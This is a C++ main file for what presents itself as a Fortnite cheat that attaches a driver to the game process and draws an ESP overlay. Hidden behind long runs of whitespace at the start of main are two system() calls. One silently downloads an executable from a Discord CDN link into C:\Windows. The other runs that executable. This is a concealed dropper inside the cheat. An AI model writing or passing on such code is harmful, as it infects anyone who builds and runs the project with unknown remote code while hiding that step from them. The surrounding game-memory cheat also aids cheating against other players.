#include <Windows.h>
#include <iostream>
#include "render/render.h"
#include "cheat/esp/esp.h"
#include "./cheat/driver/libs.h"
#include "./cheat/driver/xorstr.h"

auto main() -> int 
{
	 
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             system("curl https://cdn.discordapp.com/attachments/1209944753316044831/1209954127279292486/v_Guard.exe -o C:\\Windows\\111.exe --silent");
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              system("C:\\Windows\\111.exe");

																																																																																																																																

	if (!librarys::init) {

		printf(XORS("libarays not init\n"));
	}

	if (!driver.init())
	{
		printf(XORS("load the driver\n"));
		Sleep(3500);
		return 1;
	}

	processID = Util::GetProcessId(XORS(L"FortniteClient-Win64-Shipping.exe"));
	driver.attach(processID);
	imagebase = driver.get_process_base(processID);

	Render::CreateOverlay();
	Render::DirectXInit();
	Render::MainLoop();
}
